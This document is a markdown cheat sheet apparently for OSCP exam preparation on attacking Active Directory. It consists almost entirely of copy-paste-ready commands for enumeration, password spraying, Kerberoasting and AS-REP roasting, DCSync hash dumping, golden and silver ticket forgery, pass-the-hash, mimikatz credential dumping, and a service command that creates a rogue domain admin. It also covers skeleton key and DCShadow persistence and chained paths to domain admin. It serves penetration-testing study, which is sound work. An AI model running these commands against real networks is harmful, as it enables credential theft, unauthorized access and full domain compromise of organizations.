# OSCP Active Directory Master Guide

## Table of Contents
- [Initial Domain Discovery](#initial-domain-discovery)
- [Domain Enumeration](#domain-enumeration)
- [Authentication Attacks](#authentication-attacks)
- [Post-Authentication Attacks](#post-authentication-attacks)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)
- [Persistence](#persistence)
- [Common Attack Paths](#common-attack-paths)

## Initial Domain Discovery

### Identifying Domain Environment (Copy-Paste Ready)
```bash
# Check if target is domain-joined
nmap -p 88,389,636,3268,3269 <target>

# DNS enumeration
nslookup <target>
dig <target> ANY
dig -t SRV _ldap._tcp.<domain>

# SMB enumeration
smbclient -L //<target> -N
smbmap -H <target>
enum4linux -a <target>

# Check for domain controllers
nmap --script smb-os-discovery <target>
```

### Domain Controller Discovery
```bash
# Find domain controllers
nslookup -type=SRV _ldap._tcp.<domain>
nslookup -type=SRV _kerberos._tcp.<domain>
nslookup -type=SRV _gc._tcp.<domain>

# Using impacket
python3 GetADUsers.py -dc-ip <dc-ip> <domain>/

# PowerShell (if on Windows)
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

## Domain Enumeration

### Anonymous/Null Session Enumeration
```bash
# SMB null session
smbclient -L //<target> -N
smbmap -H <target> -u null -p null
smbmap -H <target> -u guest -p ""

# RPC null session  
rpcclient -U "" -N <target>
rpcclient> enumdomusers
rpcclient> enumdomgroups
rpcclient> queryuser <RID>
rpcclient> querygroupmem <group-RID>

# LDAP anonymous bind
ldapsearch -h <target> -x -b "DC=domain,DC=com"
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(objectclass=person)"
ldapsearch -h <target> -x -b "DC=domain,DC=com" "(objectclass=computer)"
```

### CrackMapExec Enumeration
```bash
# Basic enumeration
crackmapexec smb <target>
crackmapexec smb <target> --users
crackmapexec smb <target> --groups
crackmapexec smb <target> --shares
crackmapexec smb <target> --sessions

# With credentials
crackmapexec smb <target> -u <username> -p <password> --users
crackmapexec smb <target> -u <username> -p <password> --groups
crackmapexec smb <target> -u <username> -p <password> --shares
crackmapexec smb <target> -u <username> -p <password> --sessions
crackmapexec smb <target> -u <username> -p <password> --loggedon-users

# Domain enumeration
crackmapexec ldap <target> -u <username> -p <password> --users
crackmapexec ldap <target> -u <username> -p <password> --groups
```

### Bloodhound Data Collection
```bash
# From Linux (remotely)
bloodhound-python -u <username> -p <password> -d <domain> -dc <dc-ip> -ns <dc-ip> -c all

# From Windows (local)
# Upload SharpHound.exe to target
.\SharpHound.exe -c all
.\SharpHound.exe -c all --zipfilename bloodhound.zip

# PowerShell version
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\
```

## Authentication Attacks

### Password Spraying
```bash
# CrackMapExec password spray
crackmapexec smb <target> -u users.txt -p 'Password123!'
crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success

# Impacket SMB spray
for user in $(cat users.txt); do echo "Testing $user"; smbclient -L //<target> -U "$user%Password123!" 2>/dev/null && echo "[+] Valid: $user:Password123!"; done

# Kerberos password spray (if port 88 open)
kerbrute passwordspray -d <domain> users.txt Password123!
```

### ASREPRoast Attack
```bash
# Find users with "Do not require Kerberos preauthentication"
impacket-GetNPUsers <domain>/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# With valid domain credentials
impacket-GetNPUsers <domain>/<username>:<password> -request -format hashcat -outputfile asrep_hashes.txt

# PowerShell (from domain-joined machine)
Get-DomainUser -PreauthNotRequired -Verbose

# Crack hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Kerberoasting
```bash
# Request service tickets
impacket-GetUserSPNs <domain>/<username>:<password> -request -format hashcat -outputfile kerberoast_hashes.txt

# Target specific SPN
impacket-GetUserSPNs <domain>/<username>:<password> -request-user <target-user> -format hashcat

# PowerShell (from domain-joined machine)
Add-Type -AssemblyName System.IdentityModel
setspn -Q */*

# Crack service tickets
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### DCSync Attack (High Privileges Required)
```bash
# Dump all domain hashes
impacket-secretsdump <domain>/<username>:<password>@<dc-ip>

# Dump specific user
impacket-secretsdump <domain>/<username>:<password>@<dc-ip> -just-dc-user <target-user>

# PowerShell (Mimikatz)
lsadump::dcsync /domain:<domain> /user:<target-user>
```

## Post-Authentication Attacks

### Golden Ticket Attack
```bash
# 1. Get krbtgt hash (requires domain admin)
impacket-secretsdump <domain>/<username>:<password>@<dc-ip>

# 2. Create golden ticket
impacket-ticketer -nthash <krbtgt-hash> -domain <domain> -domain-sid <domain-sid> <fake-username>

# 3. Set ticket
export KRB5CCNAME=<fake-username>.ccache

# 4. Use ticket
impacket-psexec <domain>/<fake-username>@<target> -k -no-pass
```

### Silver Ticket Attack
```bash
# 1. Get service account hash
impacket-secretsdump <domain>/<username>:<password>@<target>

# 2. Create silver ticket for specific service
impacket-ticketer -nthash <service-hash> -domain <domain> -domain-sid <domain-sid> -spn <service-spn> <fake-username>

# 3. Use ticket
export KRB5CCNAME=<fake-username>.ccache
impacket-smbclient <domain>/<fake-username>@<target> -k -no-pass
```

### Unconstrained Delegation
```bash
# Find computers with unconstrained delegation
crackmapexec ldap <target> -u <username> -p <password> --trusted-for-delegation

# PowerShell
Get-DomainComputer -UnconstrainedDelegation

# If you compromise a machine with unconstrained delegation:
# 1. Monitor for TGTs
# 2. Extract and reuse tickets
```

### Constrained Delegation
```bash
# Find constrained delegation
crackmapexec ldap <target> -u <username> -p <password> --constrained-delegation

# PowerShell  
Get-DomainComputer -TrustedToAuth

# Exploit with impacket
impacket-getST -spn <target-spn> -impersonate <target-user> <domain>/<service-account>:<password>
export KRB5CCNAME=<target-user>.ccache
impacket-psexec <domain>/<target-user>@<target> -k -no-pass
```

## Lateral Movement

### Pass-the-Hash
```bash
# SMB lateral movement
crackmapexec smb <target-range> -u <username> -H <nt-hash> --local-auth
crackmapexec smb <target-range> -u <username> -H <nt-hash>

# PSExec with hash
impacket-psexec <domain>/<username>@<target> -hashes <lm-hash>:<nt-hash>

# WMIExec with hash
impacket-wmiexec <domain>/<username>@<target> -hashes <lm-hash>:<nt-hash>

# SMBExec with hash  
impacket-smbexec <domain>/<username>@<target> -hashes <lm-hash>:<nt-hash>
```

### Pass-the-Ticket
```bash
# Extract tickets (Windows)
mimikatz # sekurlsa::tickets /export

# Use ticket (Linux)
export KRB5CCNAME=<ticket-file>.ccache
impacket-psexec <domain>/<username>@<target> -k -no-pass

# Convert ticket formats if needed
impacket-ticketConverter <ticket-file>.kirbi <ticket-file>.ccache
```

### OverPass-the-Hash
```bash
# Use NTLM hash to get Kerberos ticket
impacket-getTGT <domain>/<username> -hashes <lm-hash>:<nt-hash>
export KRB5CCNAME=<username>.ccache
impacket-psexec <domain>/<username>@<target> -k -no-pass
```

### WinRM Lateral Movement
```bash
# Test WinRM access
crackmapexec winrm <target> -u <username> -p <password>
crackmapexec winrm <target> -u <username> -H <nt-hash>

# Connect via WinRM
evil-winrm -i <target> -u <username> -p <password>
evil-winrm -i <target> -u <username> -H <nt-hash>
```

## Privilege Escalation

### Local Admin to Domain Admin

#### Token Impersonation
```bash
# Check for SeImpersonatePrivilege
whoami /priv

# Use JuicyPotato/PrintSpoofer/RoguePotato (covered in Windows PrivEsc guide)

# Once SYSTEM, dump LSASS
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

#### Service Account Exploitation
```bash
# If service runs as domain admin
# 1. Modify service binary path
sc config <service> binpath="cmd.exe /c net user hacker Password123! /add /domain && net group 'Domain Admins' hacker /add /domain"

# 2. Restart service
sc stop <service>
sc start <service>
```

### GPO Abuse
```bash
# Find editable GPOs
crackmapexec ldap <target> -u <username> -p <password> --gpo-enum

# PowerShell
Get-DomainGPO -ComputerIdentity <target-computer>

# Edit GPO to add user to local admin group or run commands
# This requires specific tools like SharpGPOAbuse
```

### ACL Abuse
```bash
# Use Bloodhound to find ACL attack paths
# Common ACLs to look for:
# - GenericAll
# - GenericWrite  
# - WriteOwner
# - WriteDACL
# - AllExtendedRights

# Example: GenericAll on user
# Change user password
impacket-changepasswd <domain>/<attacker-user>:<password> -newpass <new-password> <target-user>@<dc-ip>

# Example: GenericWrite on computer
# Add SPN for Kerberoasting
impacket-addspn <domain>/<username>:<password> -user <target-user> -spn <fake-spn> <dc-ip>
```

## Persistence

### Domain Persistence Methods

#### Golden Ticket (Long-term)
```bash
# Create persistent golden ticket (valid for 10 years)
impacket-ticketer -nthash <krbtgt-hash> -domain <domain> -domain-sid <domain-sid> -duration 87600 <fake-admin>
```

#### Silver Ticket (Service-specific)
```bash
# Create silver ticket for specific service
impacket-ticketer -nthash <service-hash> -domain <domain> -domain-sid <domain-sid> -spn <service-spn> <fake-user>
```

#### Skeleton Key (Requires DC compromise)
```bash
# Install skeleton key (allows any password)
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Now any user can login with password "mimikatz"
```

#### DCShadow (Advanced persistence)
```bash
# Register fake DC and push malicious updates
# Requires very high privileges
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:<target-user> /attribute:ntPwdHistory /value:<new-hash>
```

## Common Attack Paths

### Path 1: Anonymous → Domain User → Domain Admin
```bash
# 1. Anonymous enumeration
enum4linux -a <target>
smbmap -H <target> -u null -p null

# 2. Find usernames
rpcclient -U "" -N <target>
rpcclient> enumdomusers

# 3. Password spray
crackmapexec smb <target> -u users.txt -p 'Password123!'

# 4. Kerberoast
impacket-GetUserSPNs <domain>/<username>:<password> -request -format hashcat

# 5. Crack and escalate
hashcat -m 13100 hashes.txt rockyou.txt
```

### Path 2: Initial Access → Local Admin → Domain Admin
```bash
# 1. Get initial shell (web app, service exploit, etc.)

# 2. Enumerate domain context
net config workstation
net user /domain

# 3. Run WinPEAS/SharpHound
.\winPEAS.exe
.\SharpHound.exe -c all

# 4. Local privilege escalation
# Use Windows PrivEsc techniques

# 5. Dump credentials as SYSTEM
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# 6. Use found credentials for lateral movement
```

### Path 3: Service Account → Kerberoasting → Domain Admin
```bash
# 1. Find service accounts
impacket-GetUserSPNs <domain>/<username>:<password>

# 2. Request tickets
impacket-GetUserSPNs <domain>/<username>:<password> -request -format hashcat

# 3. Crack tickets
hashcat -m 13100 tickets.txt rockyou.txt

# 4. Use cracked service account
crackmapexec smb <target-range> -u <service-account> -p <cracked-password>
```

## Essential Tools for AD Attacks

### Impacket Suite (Linux)
```bash
# Main tools
impacket-GetADUsers
impacket-GetNPUsers  
impacket-GetUserSPNs
impacket-secretsdump
impacket-psexec
impacket-wmiexec
impacket-smbexec
impacket-getTGT
impacket-getST
```

### CrackMapExec
```bash
# Installation
pip3 install crackmapexec

# Main protocols
crackmapexec smb
crackmapexec winrm  
crackmapexec ldap
crackmapexec mssql
```

### Bloodhound
```bash
# Data collection
bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc-ip> -ns <dc-ip> -c all

# Analysis
# Import data into Bloodhound GUI
# Look for paths to "Domain Admins"
# Check for "Shortest Paths to High Value Targets"
```

### Rubeus (Windows)
```bash
# .NET tool for Kerberos attacks
.\Rubeus.exe asreproast /format:hashcat
.\Rubeus.exe kerberoast /format:hashcat  
.\Rubeus.exe tgtdeleg
.\Rubeus.exe createnetonly /program:cmd.exe
```

## Quick Reference Commands

### One-Liner Domain Enumeration
```bash
# Quick domain discovery
for port in 88 389 636 3268; do nmap -p $port --open <target-range>; done
```

### Password Spray One-Liner  
```bash
# Test single password against user list
for user in $(cat users.txt); do echo "Testing $user"; crackmapexec smb <target> -u "$user" -p "Password123!" | grep -v "[-]"; done
```

### Hash Cracking Pipeline
```bash
# Kerberoast pipeline
impacket-GetUserSPNs <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.txt && hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Common Mistakes to Avoid

### 1. Not Collecting Enough User Information
❌ Only getting a few usernames
✅ Enumerate all users from multiple sources (RPC, LDAP, SMB)

### 2. Weak Password Lists  
❌ Using only common passwords
✅ Create targeted password lists based on company name, season, year

### 3. Ignoring Service Accounts
❌ Focusing only on user accounts
✅ Always check for service accounts - they often have weak passwords

### 4. Not Using Bloodhound
❌ Manual enumeration only
✅ Always collect Bloodhound data to find attack paths

### 5. Forgetting About Kerberos
❌ Only using NTLM authentication
✅ Test both NTLM and Kerberos authentication methods

Remember: Active Directory attacks often require patience and careful enumeration. The initial foothold might be small, but proper enumeration and understanding of trust relationships can lead to complete domain compromise!